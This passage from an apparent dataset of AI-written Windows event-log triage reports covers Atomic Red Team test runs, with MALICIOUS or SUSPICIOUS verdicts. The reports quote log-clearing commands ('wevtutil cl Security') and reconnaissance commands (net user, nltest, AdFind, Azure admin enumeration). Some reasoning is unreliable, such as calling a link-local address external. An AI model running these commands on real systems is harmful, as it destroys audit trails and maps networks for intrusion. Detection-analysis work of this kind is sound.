  - Event IDs 4672 show that `admin_test` was assigned special privileges, including `SeDebugPrivilege`, which is often leveraged for more in-depth system access and potential exploitation.

### System Log Analysis:
- **Log file cleared**:
  - Similar to the security log, the event log for the system channel was cleared, which is a suspicious activity and often used to cover malicious actions.

### Sysmon Log Analysis:
- **Event Logging Cleared**:
  - The execution of `wevtutil.exe` to clear event logs across multiple channels (Application, Security, and Windows PowerShell) by user `admin_test` is clear evidence of malicious intent, as it indicates attempts to hide traces of activity.

### Application Log Analysis:
- Routine events related to Edge updates and Windows Defender being active show usual logging activity apart from the overriding suspicious activities.

### Assessment:
The logs exhibit clear signs of potentially malicious activities, including:
1. Unauthorized or suspicious PowerShell script execution from an external source.
2. Multiple instances of event log clearing by a user with elevated privileges, which might indicate an attempt to erase tracks of unauthorized activities.
3. High-level privileges were granted to `admin_test`.

### Conclusion:
- **Resolution: MALICIOUS**

### Guidance:
1. Conduct a forensic investigation to determine the full scope of the compromise, focusing on system integrity, data integrity, and network traversal indicators.
2. Revise the credentials for `admin_test` as a precaution and review access logs for lateral movement.

4. Examine other systems in the network for potential similar activities and indicators of compromise."
System Network Connections Discovery with PowerShell,"### Analysis of the Logs

#### 1. **Windows PowerShell Log:**
- The execution of `powershell.exe` with the command `{Get-NetTCPConnection}` suggests that someone or something ran a PowerShell command to enumerate TCP connections on the system.
- While `Get-NetTCPConnection` is not inherently malicious, it can be used for reconnaissance by an attacker to view active network connections. 

#### 2. **Sysmon Log:**
- Multiple entries showing the execution of `wevtutil.exe` clearing logs (`""wevtutil.exe"" cl System`, `""wevtutil.exe"" cl Application`, etc.) is a strong indicator of log tampering. It is often used by adversaries post-compromise to cover tracks.
- The user executing these commands is `SERVER002\\admin_test`, which suggests the involvement of an account with administrative privileges.
- The presence of these events is highly suspicious, especially since they coincide closely with the execution of the PowerShell command. 

#### 3. **Application Log:**
- Moderate observation, no apparent anomalous behavior directly linked to malicious activities.

#### 4. **System Log:**
- System logs show that the event log files were cleared, specifically the System and Windows PowerShell channels, which correlates with the actions logged in Sysmon.
- Admin account `admin_test` is responsible for log clearing.

#### 5. **Security Log:**
- Event ID 1102 in the Security log indicates that the log file was cleared. This action is tied to `admin_test`, matching the suspicious activity identified in Sysmon and System logs.
- Time change events (Event ID 4616) appear to show the system time being altered, which could be suspicious as time manipulation is sometimes used to mislead incident analysis.

### Assessment and Resolution
The logs exhibit clear indicators of potentially malicious activity:
- **Log Clearing:** The repeated use of `wevtutil.exe cl` to clear logs is highly suspicious and typical of behavior intended to erase traces of unauthorized actions.
- **Privileged Account Usage:** All suspicious actions are performed by the `admin_test` account, suggesting misuse or compromise of a privileged account.
- **PowerShell Enumeration:** The enumeration of TCP connections via PowerShell by `admin_test` could indicate reconnaissance activities.

### Threats and Risks
- Potential system compromise with attempts to cover tracks by clearing logs.
- Possible misuse or compromise of administrative credentials (`admin_test`).

### Guidance and Next Steps
- **Identify and isolate** the account `admin_test` for review. Verify the legitimacy of this user’s activity and credentials.
- **Conduct a comprehensive incident response investigation** to look for other indicators of compromise or malicious activity within the system and network.
- **Implement stricter monitoring** of log activities, especially for privileged accounts and PowerShell execution, to detect similar behavior in the future.
- **Consider system restoration** from a known good state if unauthorized access or modifications are confirmed.

**Resolution: MALICIOUS** - The logs contain activity that is strongly indicative of malicious actions, notably log clearing and suspicious PowerShell commands, suggesting that further investigation is necessary."
Port-Scanning -24 Subnet with PowerShell,"Upon reviewing the provided event logs, several activities stand out as potentially suspicious or indicative of malicious behavior. Here's a detailed analysis:

1. **Log File Clearing (Events 104 & 1102 in System and Security logs):**
   - The logs indicate that the ""admin_test"" user cleared multiple logs, including the System, Windows PowerShell, and Security logs. This action is captured by Event ID ""104"" in System logs and ""1102"" in Security logs. Clearing logs is a common tactic used by attackers to cover their tracks and should be treated as highly suspicious, particularly when associated with other abnormal activities.

2. **Usage of `wevtutil.exe` (Sysmon logs):**
   - Multiple instances of `wevtutil.exe` are executed by the ""admin_test"" user to clear logs. This tool is part of Windows and is used for managing event logs. The command-line usage captured suggests this tool was used to clear evidence of actions taken on the system, aligning with the logs being cleared.

3. **Suspicious PowerShell Activity (Sysmon and Windows PowerShell logs):**
   - PowerShell scripts running commands to scan for open ports (445 and 3389) are logged. This PowerShell activity could potentially be a network reconnaissance script, often indicative of lateral movement or pre-attack reconnaissance. The complex script structure and scanning network ports without a legitimate purpose or territorial banner raise a red flag.

4. **Time Setting Modifications (Security log Event ID 4616):**
   - Changes in system time were logged shortly before the logs were cleared. This event alone does not confirm malicious intent but when paired with the above activities, it could be indicative of an attempt to confuse time-based analysis or scheduled tasks.

5. **Privilege Assignments (Security log Event ID 4672):**
   - Privileged operations were logged under the ""admin_test"" account. Notably, the account has privileges such as `SeDebugPrivilege`, which is a powerful privilege allowing users to inspect and modify processes owned by other users—a potential indicator of privilege escalation.

6. **Presence of NTLM Logon Events (Event ID 4624):**
   - There are NTLM logon events from non-standard or external IP addresses (`fe80::866a:d1f8:8d06:7bc`) which could indicate unauthorized or suspicious login activities.

Given these observations, the concatenation of cleared logs, use of system utilities for evidence deletion, execution of suspicious PowerShell scripts for network reconnaissance, and privileged accounts being utilized all strongly suggest malicious activity.

**Resolution: MALICIOUS.**
- Evidence suggests malicious actions have been taken, including log tampering, unauthorized reconnaissance, and potential privilege escalation. An immediate and thorough investigation is necessary. It's crucial to isolate the compromised system, analyze suspicious artifacts further, and review potential lateral movements or impacts on other systems. Additionally, relevant incident response and remediation measures should be executed to prevent further compromise."
Get-WmiObject to Enumerate Domain Controllers,"## Detailed Analysis:

### 1. Log File Clearing:
- **System Event ID 104** and **Security Event ID 1102** indicate that event logs were cleared on the system. Specifically, logs from the System, Security, and Windows PowerShell channels were cleared by the user ""admin_test"". 
  - **Potential Concern:** Cleared logs can be an attempt to cover tracks after unauthorized activity, or it may also be a routine cleanup by administrators. 

### 2. Utilization of Wevtutil Commands:
- Multiple occurrences of **Sysmon Event ID 1** show the execution of the `wevtutil.exe` command, which is used for clearing event logs.
  - **Command:** `""C:\\Windows\\system32\\wevtutil.exe"" cl <LogName>`
  - The command was executed by ""SERVER002\\admin_test"". 
  - **Potential Concern:** Use of `wevtutil` to clear logs can indicate malicious intent, especially if it was done to erase traces of malicious activities.

### 3. Execution of PowerShell:
- **Sysmon Event ID 1** and **PowerShell events** indicate the execution of PowerShell commands. 
  - Notably, the PowerShell command attempts to execute a script using `Get-WmiObject` which may be standard system administration or potentially a reconnaissance step if used by an unauthorized user.
  - **CommandLine:** `powershell.exe & {try { get-wmiobject -class ds_computer -namespace root\directory\ldap -ErrorAction Stop } catch { $_; exit $_.Exception.HResult }}`
  - **Potential Concern:** PowerShell is often used by attackers for executing scripts, making it worth further investigation to determine legitimacy.

### 4. Privilege Escalation Event:
- **Security Event ID 4672** indicates that the user ""admin_test"" utilized privileges like SeDebugPrivilege, among others.
  - **Potential Concern:** These privileges are powerful, often targeted by attackers during privilege escalation.

### 5. Logon and Credential Events:
- **Security Event ID 4624** shows a successful logon with a type indicating a network logon from a device named ""DESKTOP-3HL5B2P"". 
- **Multiple Event ID 5379** show unsuccessful attempts to query credentials, returning error code `3221226021`.

### Additional Observations:
- **Update and System Tasks:** Routine update tasks and system maintenance activities such as Windows Defender updates are noted and do not raise concerns.
- **Benign Process Activities:** Processes like `MpSigStub.exe`, `wuauclt.exe`, and others appear typical for update checks and system health.

## Assessment:
Given the above details, activities such as clearing of logs using `wevtutil.exe`, execution of PowerShell commands, and obtaining escalated privileges without clear context or approval raise **suspicious** indications but do not irrefutably confirm malicious actions.

## Resolution: **SUSPICIOUS**
The logs contain activities consistent with both administrative actions and potentially unauthorized activity. Further investigation is recommended to:
- Verify the intent and authorization of the user actions (""admin_test"").
- Analyze user behavior around the time of log clearing, and validate any administrative tasks.
- Assess network logons and cross-reference with user logs to spot any discrepancies or unauthorized access.

Recommendation: Implement monitoring enhancements to catch similar future activities promptly and perform a thorough audit trail to establish the legitimacy of the actions taken by ""admin_test""."
Security Software Discovery - Windows Firewall Enumeration,"After reviewing the Windows event logs, here is a detailed analysis:

### Analysis of Logs:

1. **Log File Clearing Events:**
   - The system logs show evidence of log files being cleared: 
     - Event ID 104 indicates the ""System"" log was cleared.
     - Event ID 104 indicates the ""Windows PowerShell"" log was cleared.
     - Security log Event ID 1102 indicates the ""Security"" log was cleared.
   - These actions were performed by the user ""admin_test"" on the machine ""Server002"".
   - Process responsible: `wevtutil.exe` was used to clear logs (evidence from Sysmon events showing process `C:\Windows\System32\wevtutil.exe` usage).

2. **PowerShell Activity:**
   - Multiple PowerShell events (Event ID 600) show that ""admin_test"" executed a script possibly interacting with firewall rules:
     - Command used: `powershell.exe & {Get-NetFirewallProfile | Format-Table Name, Enabled Get-NetFirewallSetting Get-NetFirewallRule | select DisplayName, Enabled, Description}`
   - This level of interaction with firewall settings via PowerShell can be indicative of reconnaissance activities or preparation for a further attack.

3. **System Time Change:**
   - Security logs show Event ID 4616 which indicates the system time was changed by ""LOCAL SERVICE"".
   - System time changes can be malicious if not authorized, as they are often used to evade timestamp-based detection mechanisms.

4. **Unexpected Use of `whoami.exe` and `HOSTNAME.EXE`:**
   - Sysmon logs indicate the execution of `whoami.exe` and `hostname.exe` within close sequences, which are commonly used utilities to gather system and user information.
   - Launched by `admin_test`, this behavior often is seen in the reconnaissance stages of a cyber attack or as part of scripted behavior.

5. **Windows Defender Updates:**
   - Microsoft Defender Antivirus updates were installed, showing standard security maintenance (Windows Update logs). This generally indicates that the antivirus is not disabled.

### Assessment of the Situation:

The presence of log file clearing in conjunction with PowerShell activity involving firewall settings is highly suspicious. These activities are typical of attempts to cover tracks or prepare a system for further compromise. The `whoami.exe` and `hostname.exe` usage, although benign on their own, are indicators that could point to unauthorized system reconnaissance when combined in this context.

### Identified Threats or Risks:

- **Log Clearing:** High risk as it suggests someone is trying to hide their activities.
- **PowerShell Activity:** The command executed can be part of a lateral movement or privilege escalation attempt.

### Resolution:

- **Resolution: MALICIOUS**

### Guidance on How to Proceed:

1. **Immediate Investigation:**
   - Conduct a full forensic investigation to determine the origin of the actions taken by ""admin_test"".
   - Verify whether the user account ""admin_test"" has been compromised.
   - Check for any unauthorized access or changes made to firewall settings post-PowerShell operations.

   - Enhance the logging and alerting mechanism to detect and alert on log-clearing activities and unexpected PowerShell commands.
   - Reassess user privileges to ensure the principle of least privilege is applied.
   - Conduct a security review and possibly reset all admin credentials if compromise is evident.

This scenario demonstrates a coordinated effort possibly related to an unauthorized system compromise attempt and requires immediate attention."
Adfind - Enumerate Active Directory OUs,"### Analysis of Windows Event Logs

#### 1. **Event Log Clearing (Potential Malicious Activity)**
- **Security Log - EventID 1102**: This event indicates that the security log has been cleared by the user `admin_test`. Clearing logs can be an indicator of an attempt to cover tracks after malicious activity.
- **System Log - EventID 104**: The system and PowerShell logs are also cleared by the same user, which is highly suspicious.

#### 2. **Execution of Utility Tools**
- **Sysmon Log - EventID 1 for `wevtutil.exe`**: Wevtutil, a command-line utility for managing Windows event logs, was used several times in a short period with the ""cl"" (clear) command, indicating manual or automated log clearing.
- **Sysmon Log - EventID 1 for `hostname.exe` and `whoami.exe`**: These are legitimate Windows binaries used to identify the logged-on user and the machine's hostname. The usage might be benign but might indicate reconnaissance or a script initiation.

#### 3. **Suspicious Process Execution**
- **Sysmon Log - EventID 1 for `cmd.exe` and `AtomicRedTeam`**: There is a command execution from `C:\\Users\\ADMIN_~1\\AppData\\Local\\Temp\\AtomicRedTeam`. The `AtomicRedTeam` directory suggests the usage of a known adversary simulation tool, possibly indicating a penetration test or simulation of attacks. However, without explicit approval or context, this usage could be unauthorized and potentially malicious.

#### 4. **High-Privilege Operations**
- **Security Log - EventID 4672**: Privileged access (SeSecurityPrivilege, etc.) granted to the `SYSTEM` user, which can be standard but, in context, could indicate heightened privileges necessary to execute the above operations and clear logs.

#### 5. **Microsoft Edge Update Activity**
- **Sysmon Log - Multiple Instances of `MicrosoftEdgeUpdate.exe`**: Numerous events related to Microsoft Edge updating processes. While frequent updates are expected and generally benign, the timing alongside other suspicious activities raises the question of whether they are masking or connected to unauthorized activities.

### Conclusion and Resolution
- The combination of log clearing, privileged process executions, use of recon and potential adversary simulation tools, alongside legitimate processes, presents a pattern closely associated with malicious activity or penetration testing.
  
### Resolution: **MALICIOUS**

#### Guidance and Next Steps
1. **Immediate Incident Response**:
   - Isolate the host `Server002` from the network to prevent further potential malicious actions.
   - Verify whether the usage of `Atomic Red Team` was authorized (e.g., as part of penetration testing activities) through internal communications.

2. **Forensic Analysis**:
   - Conduct a thorough forensic analysis of the system focusing on the timeline of events leading to the log clearing and use of `Atomic Red Team`.
   - Retain captured memory and disk images for further investigation.

3. **Review of User Activity**:
   - Review the full scope of actions performed by `admin_test` and validate this user's access rights and recent actions across other systems.

4. **Mitigation and Remediation**:
   - Revoke any unauthorized user access immediately.
   - Strengthen logging retention policies to prevent unauthorized clearing of logs.
   - Implement stricter monitoring for similar event patterns organization-wide. 

5. **Post-Incident Review**:
   - Conduct a post-incident review to determine the root cause, strengthen security measures, and ensure adherence to security policies."
Extract Edge Browsing History,"Upon analyzing the provided Windows event logs, several activities stood out that indicate potentially malicious behavior:

1. **Log Event Clearances**: 
   - The logs show frequent occurrences of log clearing operations by the user `admin_test` across the System, Security, and Windows PowerShell logs, using the `wevtutil.exe` command. This sequence is often associated with an attempt to cover tracks after unauthorized activities have been performed.

2. **Suspicious PowerShell Command Execution**:
   - A PowerShell script was executed by `admin_test` that extracts browsing history from Edge and writes it to a file in the user's Downloads directory. The command line details in logs suggest that it's scraping and exfiltrating potentially sensitive data. This usage of PowerShell, especially involving browsing history extraction, could indicate an attempt to gather sensitive user information.

3. **Execution of `wevtutil.exe` and `svchost.exe`**:
   - The Sysmon logs show multiple executions of `wevtutil.exe` and `svchost.exe` which are standard processes, but their execution under these circumstances, especially following event log clearance, could signify behavior aligned with working under special or elevated contexts or tampering.

4. **Execution Context**:
   - The user `admin_test` possesses high integrity context during these operations, further raising concerns about possible abuse of administrative privileges to execute dubious commands.

5. **Edge Update Process Analysis**:
   - There are numerous entries related to Microsoft Edge update processes and installations. While the Edge update process itself is not inherently suspicious, given the context of other activities, it could be masking some other operations, potentially using legitimate software to disguise malicious activities.

6. **Timeline**:
   - All suspicious activities such as PowerShell script execution, log clearance, and suspicious processes execution occurred within a short time frame on the same date. This might indicate a concerted effort to conduct and then cover a sequence of actions. 

**Assessment and Recommendation**:
- **Resolution: MALICIOUS -** The log activities have multiple red flags that strongly suggest malicious intent. The combination of event log clearance, sensitive data scraping via PowerShell, and the rapid execution of processes adept at concealing tracks, along with the high-privilege context usage strongly signaling a compromise.

**Guidance**:
- Immediately isolate the affected host to prevent any further unauthorized access or data exfiltration.
- Perform a detailed forensic investigation on the machine to identify and reverse any malicious changes or data extractions.
- Review and tighten user access policies, especially for accounts with elevated privileges.
- Consider deploying enhanced monitoring on other hosts within the network for similar suspicious activities.
- Evaluate existing endpoint protection measures and update or enforce additional security controls, such as stricter logging policies and anomaly detection mechanisms."
Process Discovery - Get-Process,"After conducting a thorough analysis of the provided logs from the Windows machine, the following observations are made:

1. **Log File Clearance:** 
    - Multiple instances of log files being cleared are recorded, specifically in the system, security, and PowerShell channels. The process responsible for these actions, `wevtutil.exe`, was executed by the user `admin_test`. Clearing event logs is often a technique used by attackers to cover their tracks and remove evidence of their activities. This behavior is highly suspicious and concerning.

2. **Process Execution:**
    - There are multiple instances of the process `conhost.exe` being executed with a consistent command-line argument pattern (`0xffffffff -ForceV1`). This could indicate automated or scripted task execution, particularly given its association with `wevtutil.exe` clearing logs. 
    - Additionally, there are executions of `powershell.exe` with a command to list processes (`{Get-Process}`). While commonly used by administrators, in this context where logs are being cleared, this could be part of a script or recon activity.

3. **Time Synchronization Events:**
    - The system time was adjusted (Event ID 4616 from Security logs), which might be benign. However, time changes around the periods of log clearance could be an attempt to manipulate timestamps, which avoids correlation during forensic investigations.

4. **Privilege Escalation:**
    - Elevated privileges are noted (Event ID 4672), with `SeDebugPrivilege` among others. This privilege is powerful and may denote attempts to attach to or manipulate processes potentially. 

5. **Network Activity:**
    - NTLM-based logins (Event ID 4624) are observed from IP `fe80::866a:d1f8:8d06:7bc`, resulting in multiple successful logins by user `admin_test`. While NTLM is not overly suspicious on its own, this might indicate unchecked lateral movement potential in conjunction with other suspicious activities.

6. **Miscellaneous Activity:**
    - The execution of `whoami.exe` and `hostname.exe` suggests basic enumeration attempts, possibly by a script or inquiry post-compromise to understand the current user context and machine information.

### Assessment and Resolution:

Based on the activities outlined, particularly the clearing of logs, execution of administrative utilities, and suspicious user actions, there is a strong possibility of malicious activity occurring on this system. The combination of attempts to clear logs, potential privilege escalation, and enumeration steps is indicative of an intruder covering tracks post-compromise or a rogue insider activity.

**Resolution: MALICIOUS**

### Guidance on How to Proceed:
- **Immediate Action:**
  - Isolate the affected host from the network to prevent further spread or impact.
  - Disable the `admin_test` user account until a full investigation is complete.
- **Investigation:**
  - Conduct a full forensic analysis on the host to identify the source and scope of infection.
  - Review network logs and look for any lateral movement to/from this host.
  - Check for recent changes in user permissions and system configurations.
- **Remediation:**
  - Restore from a known clean backup if available.
  - Change all administrative credentials in the environment.
  - Implement stronger monitoring for log clearance or similar indicators of compromise in the future."
Active Directory Enumeration with LDIFDE,"Based on the provided Windows event logs, there are several indicators of potentially malicious activity:

1. **Log Clearing**: 
   - The `Security`, `System`, and `Windows PowerShell` logs have been cleared as indicated by EventID 1102 in the Security log and EventID 104 in the System log. This is often a method used by attackers to cover their tracks and can be considered highly suspicious.

2. **Process Execution**:
   - The `Sysmon` log shows multiple instances of `wevtutil.exe` being used to clear event logs in various channels (e.g., Sysmon, Application, Security, Windows PowerShell). The command-line usage of `wevtutil cl` is an indicator of log tampering.

3. **Use of PowerShell**:
   - A `powershell.exe` process is launched by the user `SERVER002\admin_test`, as noted in the Sysmon logs. This can be a legitimate use, but given the surrounding context of log clearing, it should be investigated further.

4. **Command Execution**:
   - The Sysmon logs indicate the use of `cmd.exe` with `ldifde.exe`, which is a utility for importing and exporting directory objects to and from Active Directory. This activity, especially when combined with log clearing, may indicate an attempt to exfiltrate data.

5. **Privilege Escalation and High-Integrity Process Execution**:
   - The security logs show events with `SeDebugPrivilege`, `SeTakeOwnershipPrivilege`, and other high privileges being granted to `SYSTEM`. While this can be normal for certain system processes, in the context of cleared logs, it seems suspicious.

6. **Account Activity**:
   - There is repeated access to credential information with EventID 5379 with a `ReturnCode` of `3221226021`, which indicates an attempt was made to access credentials unsuccessfully.

In summary, these indicators collectively suggest an attempt was made to cover tracks of potentially unauthorized or malicious actions via clearing event logs, use of command-line tools like `wevtutil` to tamper logs, and potential data exfiltration attempts. 

**Resolution: MALICIOUS**

**Guidance**:
- Immediately perform an in-depth forensic investigation on the host to determine the full scope and intent of the malicious activity.
- Examine any newly created files or modified configurations, particularly around user accounts and Active Directory.
- Review network traffic for any unusual outgoing data that could confirm exfiltration activities.
- Ensure the affected system is isolated from the network to prevent further data breach or lateral movement by the attacker.
- Reassess your environment's security controls to prevent similar incidents in the future, such as enhanced monitoring and alerting on security and system logs tampering activities.
"
Adfind - Enumerate Active Directory Domain Controller Objects,"After carefully analyzing the provided Windows event logs from the host named ""Server002,"" I have identified several indicators of potentially malicious activity. Here’s a detailed assessment of the events:

### Analysis Summary:

1. **Log File Clearing:**
   - The `System`, `Windows PowerShell`, and `Security` event logs have been cleared (`EventID: 104 & 1102`) by the user `admin_test`. This action can be associated with an attempt to cover tracks, which is a common tactic used by attackers to hide evidence of malicious activity.

2. **PowerShell Execution:**
   - Processes involving `powershell.exe` (`ProcessId: 4500`) and other command-line interactions using `conhost.exe` and `wevtutil.exe` by `admin_test` from the same timeline hint towards the potential misuse of PowerShell and command-line utilities for malicious actions.

3. **Suspicious Command Execution:**
   - Execution of `cmd.exe` with references to `AdFind.exe` in a command line (`ProcessId: 5840`) is a known behavior associated with reconnaissance activities. `AdFind.exe` is commonly used in post-exploitation phases for actively querying Active Directory environments.

4. **Process Trees and Context:**
   - The presence of process executions like `whoami.exe`, `HOSTNAME.EXE`, and others with high integrity level from the `admin_test` context without a clear administrative purpose can be suspicious, as these are indicative of privilege and environment confirmation commands run in a compromised scenario.

5. **System File Modifications & Updates:**
   - Frequent execution of system files related to updates (`wuauclt.exe`, `MpSigStub.exe`, etc.) was noted. While this can be a normal behavior, combined with log clearing and other suspicious activities, it needs additional scrutiny to confirm authenticity.

### Conclusion:

Given the combination of cleared logs, execution of known reconnaissance tools, and other suspicious activities carried out under a high-integrity account, the evidence strongly suggests malicious activity.

Enumerate Default Domain Admin Details (Domain),"After conducting an analysis of the provided Windows event logs, I have identified notable activities and potential indicators of compromise, as follows:

1. **Log Clearing Activity:**
   - The log entries show several instances of the `wevtutil.exe` command being used to clear event logs (`Security`, `System`, and `Windows PowerShell`). This is evident from the Security logs (Event ID 1102) and System logs (Event ID 104).
   - The `admin_test` user appears to be executing these commands, which might suggest malicious intent as clearing logs is often an attempt to remove traces of activity.

2. **High-Privilege Actions:**
   - The account `admin_test` is performing actions with multiple high-privilege tokens, including `SeSecurityPrivilege`, `SeBackupPrivilege`, `SeRestorePrivilege`, `SeTakeOwnershipPrivilege`, and others (Event ID 4672). This aligns with administrative activities but may also be indicative of unauthorized privilege escalation.

3. **Unusual Command Execution:**
   - Execution of `cmd.exe` with the command line `/c net user administrator /domain` suggests querying or modifying user accounts, which may be part of enumeration or privilege manipulation activity (Sysmon: Event ID 1).
   - Use of investigative tools like `whoami.exe` and `hostname.exe` is typically associated with system enumeration activity, possibly by an intruder.

4. **Pattern of Execution:**
   - Significant usage of `Sysmon` logs to monitor process creations. The rapid execution of `wevtutil.exe` with different command lines suggests systematic clearing or manipulation of logs across different event log channels.

5. **Microsoft Edge Update Activity:**
   - Multiple Sysmon entries indicate routine Microsoft Edge updates, which are performed under the `NT AUTHORITY\SYSTEM` user context. These do not necessarily indicate malicious activity but should be correlated with any abnormal system behavior to rule out misuse of legitimate processes.

**Assessed Threat and Risks:**
The logs clearly show attempts to clear different event logs, coupled with high-privilege actions and user account manipulations which are strong indicators of potentially malicious activity. The execution of `wevtutil.exe` and commands targeting administrator account details are particularly suspicious within the context of a security review.

**Recommended Action:**

- Audit active directory logs and monitor for unauthorized changes or access patterns.
- Conduct a thorough forensic investigation of the host for potential malware presence and other indicators of compromise.
- Review existing user permissions and implement stricter access controls and logging retention policies.

Final Assessment: **MALICIOUS**  
Based on the analysis, the collection of activities observed within these logs strongly indicates a malicious pattern, suggesting deliberate actions to cover tracks and potentially escalate privileges within the system."
System Network Configuration Discovery (TrickBot Style),"Based on the analysis of the provided Windows event logs from the system ""Server002,"" here are the key observations:

1. **Log File Clearing:**
   - Several logs indicate a systematic clearing of event logs using `wevtutil.exe`, a legitimate command-line utility for managing Windows event logs. There are events showing the Security, System, and Application logs being cleared in a short time span, attributed to a user with the name ""admin_test"".
   - This behavior is generally associated with attempts to hide malicious activity, as clearing logs can obfuscate an audit trail.

2. **Suspicious Command Execution:**
   - There is an execution of `cmd.exe` with a complex command line that performs network enumeration-like operations: `ipconfig /all`, `net config workstation`, `net view /all /domain`, and `nltest /domain_trusts`. Such activity is often used to gather information about the network and domain environment, which is typical in penetration testing or compromise scenarios.

3. **Privileged Actions:**
   - Multiple privileges are assigned to the ""admin_test"" user profile, including `SeDebugPrivilege`, `SeTakeOwnershipPrivilege`, and others. Elevated privileges coupled with event log clearing suggest potential malicious intent or policy violation.

4. **Process Execution:**
   - Multiple instances of Microsoft Edge installer (`setup.exe`) running with system-level arguments are identified. While frequent updates and Edge processes can be normal, the combination with other suspicious activities demands closer scrutiny to ensure it's not an abused legitimate software or install method.

5. **Failed Credential Access:**
   - Numerous event IDs (5379) suggest attempts to retrieve credentials using process ID 4172, all with a return code of `3221226021`, indicating a failure. Continuous attempts at credential access might suggest automated credential harvesting attempts.

6. **System Updates:**
   - Some logs indicate legitimate Windows update activities, including running the `wuauclt.exe` and updating Windows Defender Antivirus. These are typical background activities.

**Assessment:**

There are multiple indicators of suspicious activities:
- **Log file tampering:** The clearing of key event logs such as Security, System, and Application logs recorded by `wevtutil.exe` executed under an admin account demonstrates clear intent to remove an audit trail.
- **Suspicious command execution:** The appearance of reconnaissance commands is indicative of preliminary activities preceding or during unauthorized system exploration.
- **Repeated failed credential accesses:** A sign of brute force or similar automated actions attempting to access sensitive information.

**Resolution:** 
- **SUSPICIOUS** - While the logs contain system administration activities, the combination, especially of log clearing and network reconnaissance commands, suggests the potential compromise and warrants further investigation. It is recommended to:
  - Immediately review recent administrative actions taken by the ""admin_test"" account.
  - Investigate how the admin credentials were obtained and used.
  - Enhance logging and monitoring to catch any future suspicious activities.
  - Conduct a thorough forensic analysis to determine the full scope of potential compromise, including network traffic analysis to identify any data exfiltration or lateral movement."
Launch DirLister Executable,"Upon analyzing the provided Windows event logs, several indicators of potentially suspicious activity are identified. Here's a detailed assessment:

1. **Event Log Cleared**: 
   - System logs indicate that the event log was cleared. Specifically, Event ID 104 indicates ""LogFileCleared"", which shows administrative actions on clearing the System and Windows PowerShell channels. Additionally, Event ID 1102 on the Security channel also indicates that event logs were cleared. Clearing event logs is a common tactic used by attackers to cover their tracks and can be highly suspicious unless there is a legitimate reason for this activity.

2. **PowerShell and Suspicious Command Execution**: 
   - There are multiple entries in the Windows PowerShell logs indicating the execution of PowerShell commands involving an external payload (`DirLister.exe`). Command lines such as `""powershell.exe & {Start-Process \""C:\\Users\\ADMIN_~1\\AppData\\Local\\Temp\\AtomicRedTeam\\..\\ExternalPayloads\\DirLister.exe\"" Start-Sleep -Second 4 Stop-Process -Name \""DirLister\""}""` are noted.
   - The use of PowerShell to execute external payloads from a temporary directory is often indicative of test scenarios or potential malicious activities.

3. **Sysmon Logs**:
   - **Executing Scripts and Payloads**: Sysmon logs show the execution of the same `DirLister.exe` via PowerShell. This is consistent with activities observed in the PowerShell logs suggesting potential suspicious activity.
   - **Use of `wevtutil`**: Multiple uses of `wevtutil.exe` to clear logs across different channels (Application, Security, System, Sysmon) further suggest attempts to remove traces of activities.

4. **Benign Activities**:
   - The logs also contain benign system activities, such as Microsoft Edge updates and regular system processes like `svchost.exe`, `wermgr.exe`, and `taskhostw.exe`, which appear to follow typical update or system support tasks.

**Resolution**: **SUSPICIOUS**

The combination of cleared logs, PowerShell execution of external payloads, and strategic use of system tools like `wevtutil` suggests suspicious activity potentially indicative of an attack scenario, including possible penetration testing or red team activities as hinted by the directory path (`AtomicRedTeam`). These require further investigation and validation, considering environmental baselines and recent administrative actions. It would be prudent to:
- Investigate the context around these activities and review any authorizations or scheduled scripts.
- Examine network connections and file modifications during these events.
- Confirm with the administrators if these activities were part of any approved security exercises.
- Monitor the system for any further indicators of compromise or unauthorized access."
Azure Security Scan with SkyArk,"Upon reviewing the provided Windows event logs, there are several indicators of potentially malicious activity:

### Suspicious or Anomalous Behavior Identified:

1. **PowerShell Execution:**
   - The logs indicate the use of PowerShell to execute a script called `AzureStealth.ps1` from a temporary directory, using a clear-text password to create a credential object and connect to Azure services (Connect-AzAccount, Connect-AzureAD). This behavior aligns with typical reconnaissance and credential access techniques used by attackers, especially in exploiting Azure environments.
   - The PowerShell script also attempts to scan Azure admins, which indicates unauthorized enumeration activities.

2. **Event Log Clearing:**
   - The system, security, and Windows PowerShell event logs were cleared by the user `admin_test`. Clearing event logs is a strong indicator of malicious activity as attackers often clear logs to cover their tracks.

3. **Sysmon Events:**
   - Several `wevtutil.exe` invocations are recorded, which correspond to the clearing of event logs (`cl` command). Given the context, this is corroborative evidence of an attempt to obfuscate malicious actions.

4. **Privilege Escalation:**
   - Security logs show that `admin_test` was granted several high-level privileges, such as `SeDebugPrivilege`, `SeBackupPrivilege`, `SeRestorePrivilege`, among others. These privileges can be exploited to perform unauthorized activities.

### Assessment of the Situation:

The presence of a script execution that involves credential use and Azure account interactions, combined with the clearing of critical event logs and the escalation of privileges, strongly indicates malicious intent. These actions demonstrate a coordinated attempt to perform reconnaissance, escalate privileges, and obfuscate activities within the environment.

### Resolution:

- **Final Resolution: MALICIOUS**

Given the indicators of compromise present in the logs, it's clear that the observed activities are consistent with malicious behavior. Immediate steps should be taken to further investigate the source of the compromise, isolate affected systems, and review access controls to prevent further unauthorized access. Additionally, ensure proper logging and monitoring to detect any similar activities in the future. Consider engaging incident response professionals to handle the situation thoroughly."

#### Observations:

1. **Log File Clearing (Security and System Logs):**
   - The Security log contains an Event ID 1102 indicating that the security log was cleared. This activity occurred on October 21, 2024, at 12:42:17.942. The logs mention the user ""admin_test"" executing the log clearance using the `wevtutil.exe` utility.
   - Similarly, the System log (Event ID 104) indicates that the System and Windows PowerShell logs were cleared around this same time frame by the same user ""admin_test"".

2. **Process Execution:**
   - Numerous `wevtutil.exe` processes, which are typically used for managing event logs, showing command lines like `""C:\\Windows\\system32\\wevtutil.exe"" cl Security`. This is indicative of scripted or automated attempts to manage log files, possibly to hide other malicious activities.
   - Unusual PowerShell command execution observed with complex commands generating random strings and executing `whoami.exe`. The PowerShell logs confirm that a potentially suspicious PowerShell script ran, saving whoami output to temporary files. The syntax and behavior are often associated with malware or scripts trying to collect information stealthily.
   - The use of `conhost.exe` processes as children of `wevtutil.exe` is consistent with attempts to execute or control command-line operations programmatically.

3. **Failed Credential Access Attempts:**
   - Multiple EventID 5379 entries show failed attempts to utilize credentials, showing ReturnCode ""3221226021"", which corresponds to access denied or insufficient credentials. These repeated, failed attempts across various process IDs suggest a possible automated or brute-force attempt to access these credentials.

4. **Software Updates and Utilities:**
   - Normal system processes and updates such as Windows Update (wuauclt.exe) and Antimalware Definitions (AM_Delta.exe), signed by Microsoft, were executed by `NT AUTHORITY\SYSTEM`, reflecting routine operations.

#### Assessment:

